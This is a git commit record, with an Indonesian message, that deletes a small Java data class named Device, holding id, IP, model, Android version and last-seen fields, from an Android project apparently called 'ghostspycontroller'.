7741c276a86846f4080444bbf6be73c1bc1dff52
p6825954-coder <p6825964@gmail.com>
2026-06-27 12:15:20 +0700

    Hapus semua Java lain, hanya MainActivity tersisa

--- app/src/main/java/com/ghostspycontroller/Device.java
+++
@@ -1,8 +0,0 @@
-package com.ghostspycontroller;
-
-public class Device {
-    public String id, ip, model, android, lastSeen;
-    public Device(String id, String ip, String model, String android, String lastSeen) {
-        this.id = id; this.ip = ip; this.model = model; this.android = android; this.lastSeen = lastSeen;
-    }
-}
